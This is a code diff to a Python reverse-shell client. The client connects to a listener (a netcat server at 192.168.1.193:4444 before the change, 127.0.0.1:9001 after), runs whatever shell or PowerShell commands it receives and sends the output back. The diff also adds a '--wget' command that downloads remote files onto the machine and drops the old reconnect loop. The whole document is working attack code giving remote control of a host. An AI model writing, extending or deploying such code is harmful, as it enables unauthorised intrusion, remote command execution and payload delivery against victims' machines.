@@ -1,6 +1,7 @@
 import socket
 import subprocess
-import time
+import sys
+import os
 
 def connect(server_ip, server_port):
     try:
@@ -11,37 +12,41 @@ def connect(server_ip, server_port):
         print("Error:", e)
         return None
 
+def download_file(url):
+    try:
+        # Use wget (or curl) to download the file
+        if sys.platform.startswith('win'):  # For Windows
+            download_cmd = f'wget {url} -OutFile downloaded_file'
+        else:  # For Unix-like systems (Linux, macOS)
+            download_cmd = f'wget {url} -O downloaded_file'
+
+        subprocess.run(download_cmd, shell=True, check=True)
+        return "File downloaded successfully."
+    except Exception as e:
+        return f"Error downloading file: {e}"
+
 def main():
-    server_ip = '192.168.1.193'  # Replace with the netcat server's IP address
-    server_port = 4444       # Replace with the same port number used on the server
+    server_ip = '127.0.0.1'  # Replace with the server's IP address
+    server_port = 9001       # Replace with the same port number used on the server
 
-    while True:
-        connection = connect(server_ip, server_port)
-        if connection:
+    connection = connect(server_ip, server_port)
+    if connection:
+        while True:
             try:
-                # Initial setup commands
-                initial_commands = [
-                    "New-Item -ItemType Directory -Path 'C:\\scripts'",
-                    "Set-Location 'C:\\scripts'"
-                ]
-
-                for cmd in initial_commands:
-                    connection.send(cmd.encode())
-                    output = connection.recv(1024).decode()
-                    print(output)  # Print command output
-                
-                while True:
-                    command = connection.recv(1024).decode()
-                    if command.lower() == 'exit':
-                        connection.close()
-                        break
-                    else:
-                        output = subprocess.Popen(["powershell", command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        stdout_data, stderr_data = output.communicate()
-                        connection.send(stdout_data + stderr_data)
+                command = connection.recv(1024).decode()
+                if command.lower() == 'exit':
+                    break
+                elif command.startswith('--wget '):
+                    url = command[len('--wget '):].strip()
+                    result = download_file(url)
+                    connection.send(result.encode())
+                else:
+                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    stdout_data, stderr_data = output.communicate()
+                    connection.send(stdout_data + stderr_data)
             except Exception:
-                connection.close()
-        time.sleep(60)  # Wait for 1 minute before attempting to reconnect
+                break
+        connection.close()
 
 if __name__ == "__main__":
     main()
